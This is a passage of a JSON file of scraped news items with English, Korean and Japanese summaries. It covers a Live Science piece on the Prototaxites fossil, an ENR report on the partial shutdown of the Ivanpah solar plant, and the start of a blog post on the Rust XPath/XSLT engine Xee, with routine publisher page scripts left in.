    "content": "Animals\n\nGiant, fungus-like organism may be a completely unknown branch of life\n\nNews\n\nBy\nJess Thomson\n\npublished\n2 days ago\n\nAn ancient and enormous organism called Prototaxites, initially found to be a type of fungus, may actually be an unknown branch of life, researchers say.\n\nComments\n( 0 )\n()\n\nWhen you purchase through links on our site, we may earn an affiliate commission. Here’s how it works.\n\nwindow.vanilla.infiniteArticlesData = [];\n\nA painting of what Prototaxites may have looked like, 400 million years ago.\n(Image credit: Painting by Mary Parrish, National Museum of Natural History.)\n\nA bizarre ancient life-form, considered to be the first giant organism to live on land, may belong to a totally unknown branch of the tree of life, scientists say.These organisms, named Prototaxites, lived around 420 million to 375 million years ago during the Devonian period and resembled branchless, cylindrical tree trunks. These organisms would have been massive, with some species growing up to 26 feet (8 meters) tall and 3 feet (1 meter) wide.Since the first Prototaxites fossil was discovered in 1843, scientists haven't been sure whether they were a plant, fungus or even a type of algae. However, chemical analyses of Prototaxites fossils in 2007 suggested they were likely a giant ancient fungus.Now, according to a paper published March 17 on the preprint server bioRxiv, Prototaxites might not have been a humongous fungus after all — rather, it may have been an entirely different and previously unknown life-form. The study has not yet been peer-reviewed.All life on Earth is classified within three domains — bacteria, archaea and eukarya — with eukarya containing all multicellular organisms within the four kingdoms of fungi, animals, plants and protists. Bacteria and archaea contain only single-celled organisms.Previous chemical analysis of Prototaxites fossils indicated that they likely fed off decaying organisms, just like many fungi do today, rather than making their food from carbon dioxide in the air like plants.However, according to this new research, Prototaxites may actually have been part of a totally different kingdom of life, separate from fungi, plants, animals and protists.\n    window.sliceComponents = window.sliceComponents || {};\n\n    externalsScriptLoaded.then(() => {\n        window.reliablePageLoad.then(() => {\n            var componentContainer = document.querySelector(\"#slice-container-newsletterForm-articleInbodyContent-TT23hGQ7XJtsjBD4MeoeD7\");\n\n            if (componentContainer) {\n                var data = {\"layout\":\"inbodyContent\",\"header\":\"Sign up for the Live Science daily newsletter now\",\"tagline\":\"Get the world\\u2019s most fascinating discoveries delivered straight to your inbox.\",\"formFooterText\":\"By submitting your information you agree to the <a href=\\\"https:\\/\\/futureplc.com\\/terms-conditions\\/\\\" target=\\\"_blank\\\">Terms & Conditions<\\/a> and <a href=\\\"https:\\/\\/futureplc.com\\/privacy-policy\\/\\\" target=\\\"_blank\\\">Privacy Policy<\\/a> and are aged 16 or over.\",\"successMessage\":{\"body\":\"Thank you for signing up. You will receive a confirmation email shortly.\"},\"failureMessage\":\"There was a problem. Please refresh the page and try again.\",\"method\":\"POST\",\"inputs\":[{\"type\":\"hidden\",\"name\":\"NAME\"},{\"type\":\"email\",\"name\":\"MAIL\",\"placeholder\":\"Your Email Address\",\"required\":true},{\"type\":\"hidden\",\"name\":\"NEWSLETTER_CODE\",\"value\":\"XLS-D\"},{\"type\":\"hidden\",\"name\":\"LANG\",\"value\":\"EN\"},{\"type\":\"hidden\",\"name\":\"SOURCE\",\"value\":\"60\"},{\"type\":\"hidden\",\"name\":\"COUNTRY\"},{\"type\":\"checkbox\",\"name\":\"CONTACT_OTHER_BRANDS\",\"label\":{\"text\":\"Contact me with news and offers from other Future brands\"}},{\"type\":\"checkbox\",\"name\":\"CONTACT_PARTNERS\",\"label\":{\"text\":\"Receive email from us on behalf of our trusted partners or sponsors\"}},{\"type\":\"submit\",\"value\":\"Sign me up\",\"required\":true}],\"endpoint\":\"https:\\/\\/newsletter-subscribe.futureplc.com\\/v2\\/submission\\/submit\",\"analytics\":[{\"analyticsType\":\"widgetViewed\"}],\"ariaLabels\":{}};\n\n                var triggerHydrate = function() {\n                    window.sliceComponents.newsletterForm.hydrate(data, componentContainer);\n                }\n\n                if (window.lazyObserveElement) {\n                    window.lazyObserveElement(componentContainer, triggerHydrate);\n                } else {\n                    triggerHydrate();\n                }\n            }\n        }).catch(err => console.error('%c FTE ','background: #9306F9; color: #ffffff','Hydration Script has failed for newsletterForm-articleInbodyContent-TT23hGQ7XJtsjBD4MeoeD7 Slice', err));\n    }).catch(err => console.error('%c FTE ','background: #9306F9; color: #ffffff','Externals script failed to load', err));\nSign up for the Live Science daily newsletter nowGet the world’s most fascinating discoveries delivered straight to your inbox.Contact me with news and offers from other Future brandsReceive email from us on behalf of our trusted partners or sponsorsBy submitting your information you agree to the Terms & Conditions and Privacy Policy and are aged 16 or over.The researchers studied the fossilized remains of one Prototaxites species named Prototaxites taiti, found preserved in the Rhynie chert, a sedimentary deposit of exceptionally well-preserved fossils of early land plants and animals in Scotland. This species was much smaller than many other species of Prototaxites, only growing up to a few inches tall, but it is still the largest Prototaxites specimen found in this region.Upon examining the internal structure of the fossilized Prototaxites, the researchers found that its interior was made up of a series of tubes, similar to those within a fungus. But these tubes branched off and reconnected in ways very unlike those seen in modern fungi.\"We report that Prototaxites taiti was the largest organism in the Rhynie ecosystem and its anatomy was fundamentally distinct from all known extant or extinct fungi,\" the researchers wrote in the paper. \"We therefore conclude that Prototaxites was not a fungus, and instead propose it is best assigned to a now entirely extinct terrestrial lineage.\"True fungi from the same period have also been preserved in the Rhynie chert, enabling the researchers to chemically compare them to Prototaxites. In addition to their unique structural characteristics, the team found that the Prototaxites fossils left completely different chemical signatures to the fungi fossils, indicating that the Prototaxites did not contain chitin, a major building block of fungal cell walls and a hallmark of the fungal kingdom. The Prototaxites fossils instead appeared to contain chemicals similar to lignin, which is found in the wood and bark of plants.\"We conclude that the morphology and molecular fingerprint of P. taiti is clearly distinct from that of the fungi and other organism preserved alongside it in the Rhynie chert, and we suggest that it is best considered a member of a previously undescribed, entirely extinct group of eukaryotes,\" the researchers wrote.Kevin Boyce, a professor at Stanford University, led the 2007 study that posited Prototaxites is a giant fungus and was not involved in this new research. However, he told the New Scientist that he agreed with the study's findings.RELATED STORIES—Scientists discover new 15 million-year old fish with last meal fossilized inside its stomach—30,000-year-old fossilized vulture feathers 'nothing like what we usually see' preserved in volcanic ash—Iguanas sailed one-fifth of the way around the world on rafts 34 million years ago\"Given the phylogenetic information we have now, there is no good place to put Prototaxites in the fungal phylogeny,\" Boyce said. \"So maybe it is a fungus, but whether a fungus or something else entirely, it represents a novel experiment with complex multicellularity that is now extinct and does not share a multicellular common ancestor with anything alive today.\"More research into Prototaxites fossils needs to be done to determine if they were fungi or a completely different type of life, and what caused them to go extinct millions of years ago.\"The conclusion that it is a completely unknown eukaryote certainly creates an air of mystery and intrigue around it — probably not likely to be solved until more fossils are discovered or new analytical techniques developed,\" Brett Summerell, a plant pathologist and fungi expert at the Botanic Gardens of Sydney, Australia, who not involved in this new study, told the New Scientist.\n\nJess ThomsonSocial Links NavigationLive Science ContributorJess Thomson is a freelance journalist. She previously worked as a science reporter for Newsweek, and has also written for publications including VICE, The Guardian, The Cut, and Inverse. Jess holds a Biological Sciences degree from the University of Oxford, where she specialised in animal behavior and ecology.\n\nYou must confirm your public display name before commenting\nPlease logout and then login again, you will then be prompted to enter your display name.\n\nLogout\n\nMore about animals\n\nFish in the Mariana Trench all have the same, unique mutations\n\n4 snow leopards spotted together on remote Pakistan mountain in rare footage\n\nLatest\n\nScientists uncover 'inside-out, legless, headless wonder' that lived long before the dinosaurs\n\nSee more latest\n\nMost Popular\n\nScientists uncover 'inside-out, legless, headless wonder' that lived long before the dinosaurs\n\nHuge steam plume rises from Alaska's Mount Spurr as volcano edges closer to eruption\n\nFish in the Mariana Trench all have the same, unique mutations\n\nStaring at the March 29 solar eclipse can cause eye damage in seconds — and you won’t even feel it happening\n\n'Woolly devil' flowers in Texas desert are the 1st new plant genus discovered in a US national park in almost 50 years\n\nFlat, razor-thin telescope lens could change the game in deep space imaging — and production could start soon\n\nEclipse map: What will tomorrow's solar eclipse look like from your state?\n\n4 snow leopards spotted together on remote Pakistan mountain in rare footage\n\nJames Webb telescope zooms in on bizarre 'Einstein ring' caused by bending of the universe\n\nHow to watch tomorrow's solar eclipse from anywhere on Earth\n\nfunction loadTaboola()\n{\nvar script = window.document.createElement('script');\nscript.async = 1;\nscript.src = '//cdn.taboola.com/libtrc/futureplc-network/loader.js';\nvar insertLocation = window.document.getElementsByTagName('script')[0];\ninsertLocation.parentNode.insertBefore(script, insertLocation);\n}\nfunction taboolaInit(){\nwindow._taboola = window._taboola || [];\nwindow._taboola.push({article: 'auto'});\n(window.Promise\n? window.Promise.all([window.reliablePageLoad, window.reliableConsentGiven])\n: window.reliableConsentGiven\n).then(function () {\nvar delay = 0;\nwindow.setTimeout(loadTaboola, delay)\n});\n};\ntaboolaInit();\n\nwindow._taboola = window._taboola || [];\nvar screenWidth = window.screen.width;\nfunction taboola_is_device(device) {\nif ((! device) || device === null || (typeof device) === 'undefined') return true\nif (device === 'amp') return false\nif (device === 'desktop' && screenWidth >= 700) return true\nif (device === 'mobile' && screenWidth < 700) return true\nreturn false\n}\n\n(function(){\nvar suitableDevice = taboola_is_device(\"desktop\");\nvar suitablePlacement = !(\"Mid Article\".includes('Mid Article') && \"\") &&\n!(\"Mid Article\".includes('Mid Article') && window.FUTR && window.FUTR.Kiosq && window.FUTR.Kiosq.hasBarrier);\nif (suitableDevice && suitablePlacement) {\nwindow._taboola.push({\nmode: \"thumbnails-a-mid\",\ncontainer: \"desktop-taboola-mid-article\",\nplacement: \"Mid Article\",\ntarget_type: \"mix\",\n});\n}\n})();\n\n(function(){\nvar suitableDevice = taboola_is_device(\"mobile\");\nvar suitablePlacement = !(\"Mid Article\".includes('Mid Article') && \"\") &&\n!(\"Mid Article\".includes('Mid Article') && window.FUTR && window.FUTR.Kiosq && window.FUTR.Kiosq.hasBarrier);\nif (suitableDevice && suitablePlacement) {\nwindow._taboola.push({\nmode: \"thumbnails-a-mid\",\ncontainer: \"mobile-taboola-mid-article\",\nplacement: \"Mid Article\",\ntarget_type: \"mix\",\n});\n}\n})();\n\n(function(){\nvar suitableDevice = taboola_is_device(\"desktop\");\nvar suitablePlacement = !(\"Below Article Thumbnails\".includes('Mid Article') && \"\") &&\n!(\"Below Article Thumbnails\".includes('Mid Article') && window.FUTR && window.FUTR.Kiosq && window.FUTR.Kiosq.hasBarrier);\nif (suitableDevice && suitablePlacement) {\nwindow._taboola.push({\nmode: \"thumbnails-f\",\ncontainer: \"taboola-below-article-thumbnails\",\nplacement: \"Below Article Thumbnails\",\ntarget_type: \"mix\",\n});\n}\n})();\n\n(function(){\nvar suitableDevice = taboola_is_device(\"mobile\");\nvar suitablePlacement = !(\"Mobile Below Article Thumbnails\".includes('Mid Article') && \"\") &&\n!(\"Mobile Below Article Thumbnails\".includes('Mid Article') && window.FUTR && window.FUTR.Kiosq && window.FUTR.Kiosq.hasBarrier);\nif (suitableDevice && suitablePlacement) {\nwindow._taboola.push({\nmode: \"thumbnails-g\",\ncontainer: \"taboola-mobile-below-article-thumbnails\",\nplacement: \"Mobile Below Article Thumbnails\",\ntarget_type: \"mix\",\n});\n}\n})();\n\n(function(){\nvar delay = 0;\nwindow.setTimeout(function() {\nwindow._taboola.push({flush: true});\n}, delay);\n})();\n\n    if (window.sliceHydrationLazy) {\n        window.sliceHydrationLazy(\"popularBox\", \"popularBox\", JSON.stringify({\"tabs\":[{\"tabName\":\"Latest Articles\",\"articles\":[{\"href\":\"\\/animals\\/extinct-species\\/scientists-uncover-inside-out-legless-headless-wonder-that-lived-long-before-the-dinosaurs\",\"heading\":\"Scientists uncover 'inside-out, legless, headless wonder' that lived long before the dinosaurs\",\"image\":{\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/GugvyuJLNHqHRGmgEmjE7T.jpg\",\"alt\":\"The fossil Keurbos susanae - or Sue - in the rock.\",\"fullscreen\":false,\"lazyLoading\":true,\"dataHydrate\":true,\"addSEOMetaData\":false}},{\"href\":\"\\/planet-earth\\/volcanos\\/huge-steam-plume-rises-from-alaskas-mount-spurr-as-volcano-edges-closer-to-eruption\",\"heading\":\"Huge steam plume rises from Alaska's Mount Spurr as volcano edges closer to eruption\",\"image\":{\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/Qu4n5FmRQWXMhHifYiujNF.jpg\",\"alt\":\"Mount spurr\",\"fullscreen\":false,\"lazyLoading\":true,\"dataHydrate\":true,\"addSEOMetaData\":false}},{\"href\":\"\\/animals\\/fish\\/fish-in-the-mariana-trench-all-have-the-same-unique-mutations\",\"heading\":\"Fish in the Mariana Trench all have the same, unique mutations\",\"image\":{\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/F44iXEUuNSmx7E8Dz5rhP6.jpg\",\"alt\":\"Illustration of the earth and its oceans with different deep sea species that surround it,\",\"fullscreen\":false,\"lazyLoading\":true,\"dataHydrate\":true,\"addSEOMetaData\":false}},{\"href\":\"\\/health\\/anatomy\\/staring-at-the-march-29-solar-eclipse-can-cause-eye-damage-in-seconds-and-you-wont-even-feel-it-happening\",\"heading\":\"Staring at the March 29 solar eclipse can cause eye damage in seconds \\u2014 and you won\\u2019t even feel it happening\",\"image\":{\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/BCWj4K5cdXLqbKHV3SWV7h.jpg\",\"alt\":\"A kid is shown looking at the solar eclipse while wearing special protective glasses\",\"fullscreen\":false,\"lazyLoading\":true,\"dataHydrate\":true,\"addSEOMetaData\":false}},{\"href\":\"\\/planet-earth\\/plants\\/woolly-devil-flowers-in-texas-desert-are-the-1st-new-plant-genus-discovered-in-a-us-national-park-in-almost-50-years\",\"heading\":\"'Woolly devil' flowers in Texas desert are the 1st new plant genus discovered in a US national park in almost 50 years\",\"image\":{\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/XaWDSQQnyiBU8AmsyK5PoF.jpg\",\"alt\":\"The wooly devil (Ovicula biradiata), a flowering plant that appears soft and fuzzy.\",\"fullscreen\":false,\"lazyLoading\":true,\"dataHydrate\":true,\"addSEOMetaData\":false}}]}]}), \"https://slice.vanilla.futurecdn.net/13-2-0/js/popularBox.js\");\n    } else {\n        console.error('%c FTE ','background: #9306F9; color: #ffffff','no lazy slice hydration function available');\n    }\nLATEST ARTICLES1Scientists uncover 'inside-out, legless, headless wonder' that lived long before the dinosaurs2Huge steam plume rises from Alaska's Mount Spurr as volcano edges closer to eruption3Fish in the Mariana Trench all have the same, unique mutations4Staring at the March 29 solar eclipse can cause eye damage in seconds — and you won’t even feel it happening5'Woolly devil' flowers in Texas desert are the 1st new plant genus discovered in a US national park in almost 50 years\n\nif(FUTR && FUTR.Connect){\n//Init Connect article History\nclass userNav {\nconstructor(key = 'connect_articles_history') {\nthis.key = key;\nthis.flushKey = `${key}_flush`;\nthis.propsKey = `${key}_props`;\nthis.store();\nconsole.info(\"FUTR.Connect.userNav - Init - Start - Using reduxStore\");\n}\nstore() {\nconst isArticle = window?.reduxStore?.getState()?.vanilla?.isArticle;\nif (typeof isArticle !== 'undefined' && isArticle && FUTR && FUTR.Connect) {\ntry {\nconst month = `${new Date().getFullYear()}-${new Date().getMonth()}`;\n//flush monthly\nif (localStorage.getItem(this.flushKey) !== month) {\nlocalStorage.setItem(this.key, btoa('[]'));\nlocalStorage.setItem(this.propsKey, []);\nlocalStorage.setItem(this.flushKey, month);\n}\nconst currentUrl = location.pathname;\nconst urls = JSON.parse(atob(localStorage.getItem(this.key) || btoa('[]')));\nconst props = JSON.parse(localStorage.getItem(this.propsKey)|| '[]');\nif (!urls.includes(currentUrl) && this.getProps().length < 20 || this.getProps().length <1) {\nurls.push(currentUrl);\nif (window.ffte && window.ffte.properties) {\nprops.push(window.ffte.properties);\nconsole.log(\"props push\", props)\n}\nlocalStorage.setItem(this.key, btoa(JSON.stringify(urls)));\nlocalStorage.setItem(this.propsKey, JSON.stringify(props));\n}\nconsole.info(\"FUTR.Connect.userNav - Urls Stored\");\n} catch (e) {\nconsole.warn('userNav:', e);\n}\n}\n}\ngetHistory() {\ntry {\nreturn JSON.parse(atob(localStorage.getItem(this.key) || btoa('[]')));\n} catch {\nreturn [];\n}\n}\ngetProps() {\ntry {\nreturn JSON.parse(localStorage.getItem(this.propsKey) || '[]');\n} catch {\nreturn [];\n}\n}\n};\nFUTR.Connect.userNav = new userNav();\nconsole.info(\"FUTR.Connect.userNav - Init - Done\", FUTR.Connect.userNav);\n}",
    "summary": {
      "en": "Researchers have discovered that Prototaxites, a large ancient organism once thought to be a type of fungus, may actually be a completely unknown branch of life. This organism existed between 420 million and 375 million years ago and could grow up to 26 feet tall. Initially classified as a fungus due to its structure and feeding habits, recent studies suggest it might belong to an entirely different group of eukaryotes.\n\nFossils of Prototaxites, including a species called Prototaxites taiti found in Scotland, show unique internal structures that differ from known fungi. Chemical analyses revealed that it lacked chitin, a key component of fungal cell walls, and instead contained materials similar to those in plants. This discovery raises questions about its classification and suggests that Prototaxites represents a novel form of multicellular life that is now extinct. Further research is needed to fully understand this mysterious organism.",
      "ko": "연구자들은 한때 곰팡이의 일종으로 여겨졌던 고대 생물 프로토택사이트스가 사실은 완전히 새로운 생명체의 한 갈래일 수 있다는 사실을 발견했습니다. 이 생물은 약 4억 2천만 년에서 3억 7천5백만 년 전 사이에 존재했으며, 최대 8미터까지 자랄 수 있었습니다. 구조와 먹이 습성 때문에 처음에는 곰팡이로 분류되었지만, 최근 연구에서는 이 생물이 전혀 다른 진핵생물 그룹에 속할 가능성이 제기되고 있습니다.\n\n스코틀랜드에서 발견된 프로토택사이트스 타이티라는 종을 포함한 프로토택사이트스의 화석은 알려진 곰팡이와는 다른 독특한 내부 구조를 보여줍니다. 화학 분석 결과, 이 생물은 곰팡이 세포벽의 주요 성분인 키틴이 없고, 대신 식물에서 발견되는 물질과 유사한 성분을 포함하고 있음을 밝혀냈습니다. 이러한 발견은 프로토택사이트스의 분류에 대한 의문을 제기하며, 이 생물이 현재 멸종된 새로운 형태의 다세포 생명체를 나타낸다고 제안합니다. 이 신비로운 생물을 완전히 이해하기 위해서는 추가 연구가 필요합니다.",
      "ja": "研究者たちは、古代の大きな生物であるプロトタキサイトが、かつては菌類の一種と考えられていたが、実際には全く未知の生命の系統である可能性があることを発見しました。この生物は、4億2000万年前から3億7500万年前に存在し、最大で約8メートルの高さに成長することができました。構造や摂食習慣から最初は菌類として分類されていましたが、最近の研究では、全く異なる真核生物のグループに属する可能性が示唆されています。\n\nスコットランドで発見されたプロトタキサイト・タイティという種を含む化石は、既知の菌類とは異なる独特の内部構造を示しています。化学分析の結果、菌類の細胞壁の重要な成分であるキチンが欠けており、代わりに植物に似た材料を含んでいることがわかりました。この発見は、その分類に疑問を投げかけ、プロトタキサイトが現在は絶滅した新しい形の多細胞生物を表していることを示唆しています。この謎の生物を完全に理解するためには、さらなる研究が必要です。"
    }
  },
  {
    "id": "df683903503e15e7",
    "title": {
      "en": "Ivanpah Solar Thermal Units Shutting Down, as Tech Shifts",
      "ko": "아이반파 태양열 발전소 종료",
      "ja": "イヴァンパ太陽光発電停止"
    },
    "type": "story",
    "url": "https://www.enr.com/articles/60307-older-ivanpah-solar-plant-in-california-will-close-units-as-tech-shifts",
    "score": 5,
    "by": "LMSolar",
    "time": 1743263059,
    "content": "NewsWestWest Construction NewsPower & Industrial\n\n      Renewable Energy\n\n    Older Ivanpah Solar Plant in California Will Close Units, as Tech Shifts\n\n    By James Leggate\n\n      Each of Ivanpah Solar Power Plant's three towers is surrounded by thousands of mirrors.Photo by Dennis Schroeder/National Renewable Energy Laboratory\n\n        February 13, 2025\n\n    Power plant operator and co-owner NRG Energy Inc. is preparing to close down part of its Ivanpah Solar Power Plant in San Bernardino County, Calif., a little more than 11 years after it began operating. NRG agreed to terminate a pair of long-term purchase power agreements with utility Pacific Gas and Electric Co. for energy generated at the facility, which still uses technology the operator says has been surpassed by solar silicon photovoltaic generation.Ivanpah is a concentrating solar power plant, which uses 173,500 heliostats—essentially mirrors on movable mounts so they can track the sun—to reflect sunlight onto boilers at the top of 450-ft-tall towers to make steam that turns turbines to generate power.The plant has three units, each with its own tower surrounded by an array of heliostats, for a total capacity of 386 MW.The utility contracted to purchase power from two of the units through 2039. But it said in a statement that in 2021— after the California Public Utilities Commission ordered investor-owned utilities to evaluate their energy sources—it identified its Ivanpah power purchase agreements as a potential area to find cost savings, with plant owners offering the opportunity to terminate the agreements. The companies, along with the U.S. Dept. of Energy, finalized negotiations to end the agreements last month. DOE provided $1.6 billion in loan guarantees for the project.Houston-based NRG said in a statement that the negotiations allowed the department “to maximize the recovery of its loans and provide savings for California ratepayers.” An NRG representative did not say how much of the loan was repaid when asked, but said in a statement that the “concentrating solar power project was an innovative public-private partnership uniting government entities with private business in the advancement of renewable energy.”A second utility, Southern California Edison, also contracted to buy power from the third Ivanpah unit through 2039. Its representative told ENR that the utility is in ongoing discussions with plant owners and DOE related to buyout of its Ivanpah contract.NRG said it is now seeking approvals from state and federal officials to begin closing down the units next year for decommissioning. An NRG representative did not provide added details to ENR about the work or cost of decommissioning.Concentrating SolarIvanpah was the largest concentrating solar power plant in the world at the time of its construction, and NRG said the project still demonstrated the technology’s viability.Construction of the $2.2-billion plant started in 2010 with Bechtel Corp. as engineering, procurement and construction contractor. It began operations in late 2013 and remains the largest plant of its kind built in the U.S. .At the time of Ivanpah’s construction, utility PG&E was investing in various kinds of developing clean energy technologies, including solar photovoltaic, hydroelectricity, wind, biomass and geothermal.“It’s so important to support investment in different projects as we look to solve climate challenges,” said Don Howerton, PG&E senior director of commercial procurement, in a statement. “It’s not clear in the early stages what technologies will work best and be most affordable for customers.”Improvements in solar photovoltaic wafers and panels and battery energy storage have made them more affordable options at large scale, Howerton added. The technologies have “raced ahead” in terms of affordability, according to PG&E.Photovoltaic, or PV, technology uses siliconcrystals that are laminated into layers, often called wafers, with opposite charges.When solar light hits the crystals, it creates a direct electric current through a process called the photovoltaic effect.Ivanpah's generation is believed to have prevented 500,000 metric tons of carbon dioxide emissions annually, according to the Energy Dept. But once operational, it drew criticism following reports that insects and birds were burned to death when they flew too close to the white-hot tower tops. A 2015 report prepared for the state by ecological consulting firm H.T. Harvey & Associates estimated the plant killed about 3,500 birds in its first year of operation.Ivanpah also faced performance issues. In 2014, plant owners got permission from state officials to increase its annual limit of natural gas for its boilers from 328 million cu ft to 525 million cu ft, citing a need to use more fuel to power turbines to compensate for intermittent cloud cover.“When the power purchase agreements were signed in 2009, the prices were competitive, but advancements over time in PVs and battery storage have led to more eﬃcient, cost-effective and flexible options for producing reliable clean energy,” NRG said in an emailed statement.The plant occupies more than 3,200 acres of federal land in the Mojave Desert near the California-Nevada state line. In its statement, NRG suggested the site could be repurposed for solar silicon photovoltaic energy production after decommissioning of the existing plant, but did not share any specific plans for that future work.\n\n    KEYWORDS:  NRG Energy   PG&E   solar construction   solar energy   Southern California Edison\n\n    Share This Story\n\n  James Leggate is an online news editor at ENR. He has reported on a variety of issues for more than 10 years and his work has contributed to several regional Associated Press Media Editors and Murrow award wins.\n\n      Post a comment to this article\n\n          Name*\n\n          E-mail (will not be displayed)*\n\n          Subject\n\n          Comment*\n\n\tUnable to fetch comments.\n\n\t\t\tReport Abusive Comment\n\n\t\t\t\tThank you for helping us to improve our forums. Is this comment offensive? Please tell us why.\n\n\t\tfunction initReportAbusiveCommentForm () {\n\t\t\t$(\"#report-abusive-comment-form\").overlay({\n\t\t\t\ttop: 'center',\n\t\t\t\texpose: { color: '#000', loadSpeed: 200, opacity: 0.6 },\n\t\t\t\tcloseOnClick: true\n\t\t\t});\n\n\t\t\t$(\"#comment-list\").delegate (\".modalInput\", \"click\", function(e) {\n\t\t\t\te.preventDefault();\n\t\t\t\te.stopPropagation();\n\t\t\t\t$(\"#comment_flag_form\").attr (\"action\", \"/comments/flag/article/\" + e.target.href.split (/\\#id=/)[1]);\n\t\t\t\t$(\"#report-abusive-comment-form\").overlay().load();\n\t\t\t});\n\t\t}\n\t\t$(document).ready(\n\t\t\tfunction () {\n\t\t\t\tif (window.customInitReportAbusiveCommentForm) {\n\t\t\t\t\twindow.customInitReportAbusiveCommentForm ();\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tinitReportAbusiveCommentForm ();\n\t\t\t\t}\n\t\t\t}\n\t\t);",
    "summary": {
      "en": "The Ivanpah Solar Power Plant in California, operated by NRG Energy Inc., will close some of its units after more than 11 years of operation. This decision follows the termination of long-term power purchase agreements with Pacific Gas and Electric Co. (PG&E), as newer solar technologies have become more cost-effective. Ivanpah, which was once the largest concentrating solar power plant in the world, uses mirrors to concentrate sunlight and generate power but has faced performance issues and environmental criticisms, including bird fatalities.\n\nThe U.S. Department of Energy had supported the project with $1.6 billion in loan guarantees, and negotiations to end the contracts aimed to recover loans and save costs for California ratepayers. NRG is now seeking approvals to begin decommissioning the units next year and has suggested that the site could be repurposed for newer solar technologies after the shutdown.",
      "ko": "캘리포니아에 위치한 아이반파 태양광 발전소가 11년 넘게 운영된 후 일부 유닛을 폐쇄하기로 결정했습니다. 이 결정은 태평양 가스 및 전기 회사(PG&E)와의 장기 전력 구매 계약이 종료된 데 따른 것입니다. 최근의 태양광 기술이 더 비용 효율적으로 발전하면서 이러한 변화가 이루어졌습니다. 아이반파는 한때 세계에서 가장 큰 집광형 태양광 발전소였으며, 거울을 사용해 햇빛을 집중시켜 전력을 생산하지만, 성능 문제와 조류 사망 등 환경적 비판에 직면해 있었습니다.\n\n미국 에너지부는 이 프로젝트에 16억 달러의 대출 보증을 지원했으며, 계약 종료를 위한 협상은 대출금을 회수하고 캘리포니아 전기 요금 납부자들의 비용을 절감하기 위한 목적이었습니다. NRG 에너지는 내년에 유닛의 해체를 시작하기 위한 승인을 요청하고 있으며, 발전소가 폐쇄된 후에는 새로운 태양광 기술을 위한 용도로 재활용될 수 있다고 제안했습니다.",
      "ja": "カリフォルニア州にあるアイバンパー太陽光発電所が、11年以上の運転を経て一部のユニットを閉鎖することになりました。この決定は、パシフィック・ガス・アンド・エレクトリック社（PG&E）との長期電力購入契約が終了したことを受けたもので、新しい太陽光技術がよりコスト効率的になったためです。アイバンパーはかつて世界最大の集中型太陽光発電所でしたが、鏡を使って太陽光を集めて発電する方式において、性能の問題や鳥類の死亡など環境への批判に直面してきました。\n\nアメリカ合衆国エネルギー省は、このプロジェクトに対して16億ドルの融資保証を提供していました。契約終了に向けた交渉は、融資の回収とカリフォルニアの電力利用者のコスト削減を目的としています。NRGエナジー社は、来年にユニットの廃止を開始するための承認を求めており、閉鎖後にはこの場所を新しい太陽光技術に再利用する提案もしています。"
    }
  },
  {
    "id": "f068670bb2ee81fe",
    "title": {
      "en": "Xee: A Modern XPath and XSLT Engine in Rust",
      "ko": "엑스이: 러스트의 현대적 XPath/XSLT 엔진",
      "ja": "Rustで進化するXPath/XSLT"
    },
    "type": "story",
    "url": "https://blog.startifact.com/posts/xee/",
    "score": 370,
    "by": "robin_reala",
    "time": 1743144498,
    "content": "Xee: A Modern XPath and XSLT Engine in Rust\n\n        By Martijn Faassen•2025-03-27•Tags:xml,rust,xpath,lxml\n\n            For the last two years I've been working on a programming language\nimplementation in Rust named Xee. Xee stands for \"XML Execution Engine\" and\nit supports modern versions of XPath and XSLT. Those are programming languages,\nand yes, that's XML stuff.\nNow hold on. Your brain might shut down when I talk about XML. I totally get\nthat XML may not be your cup of tea. But I'm also going to be talking about a\nstrange different world of technology where everything is specified, and the\nimplementation of a programming language using Rust, so I hope you still decide\nto read on if those topics could interest you.\nAnd if XML does happen to be your cup of tea, I think you should be excited\nabout Xee, as I think it can help secure a better future for XML technologies.\nHere's the Xee repository.\nThere are two highlights: a command-line tool\nxee\nthat lets you do XPath queries, and a Rust library\nxee-xpath to issue XPath\nqueries from Rust.\n\nGenesis\nIn 2023 I was asked by Paligo, my amazing and generous\nclient, whether I wanted to implement a modern version of XPath and XSLT in\nRust. I felt extremely nervous for a week. Then I told them that this was a big\nproject. I told them that I could do it and I was excited to do it, but it was\ngoing to be a lot of work.\nAnd although I was right to be very intimidated by the scope, I still\nunderestimated the effort at the time.\nBut Xee has come a long way nonetheless! I'm going to take you along on its\njourney if you're willing to follow.\n\nWhat is Xee?\nXee is a programming language implementation. It implements two core XML\nprogramming languages: XPath and,\npartially at the time of writing, XSLT.\nXPath is an XML query language, and XSLT is a language that uses XPath as its\nexpression language which lets you transform XML documents into other\ndocuments. Xee implements modern versions of these specifications, rather\nthan the versions released in 1999.\nXee implements these languages in the Rust programming language. This brings\nmodern XML technology not just to Rust. Rust is a systems programming language\nand is good at integration with other programming languages. So Xee can bring\nits capabilities to other programming languages as well, from PHP to Python.\nI've already experimented with PHP\nbindings.\nSince Xee is written in Rust, it should also be possible to compile the Xee\ninterpreter to WASM and run this stuff in the browser.\nI'll continue to talk about how Xee is implemented later, but first we'll take\na break and share some XML history.\n\nXML history\nLet's talk a bit about XML. XML emerged in the late 90s, and though it may be\ndifficult to believe now, for a while in the early part of the 2000s, XML was a\ncool technology everyone wanted to use. There was much excitement in the form\nof industry activity and many computer science papers were also published.\nTo illustrate how big this was, last year I was at the RustNL conference and I\nspoke to two separate speakers who mentioned they had worked on an XSLT\nengine1 in the past. One of them was Niko\nMatsakis, Rust core developer.\nSo me being a young and hip developer back then 2, I was doing cool XML\nstuff too. My biggest accomplishment in the XML space was the creation of\nlxml, the XML library for Python. I started that project in\nlate 2004. Early on Stefan Behnel\njoined the project and he has competently maintained it ever since - it would\nnot have been as successful without him.\nWhile XML technology isn't cool anymore today, it's still everywhere. The core\nlanguage web browsers use is not XML but its close cousin HTML. Embedded in\nHTML are true XML-based languages, such as SVG and MathML. Even though JSON and\nother languages took a large chunk out of it, XML is still used to store and\ntransmit a lot of data, and it's extensively used for documents as well, in\nformats such as docbook and JATS. XML is now niche technology, but it's a\nbigger niche than you might think, and it's not going to go away any time soon.\nIn my own career, I became less and less involved with XML over time, though\nI'd still run into it on a regular basis. It's both amusing and useful that\nwhenever I talk to a potential client that uses Python, they're already using\nlxml somewhere.\nA few years ago I entered back into the XML world. And here I am, 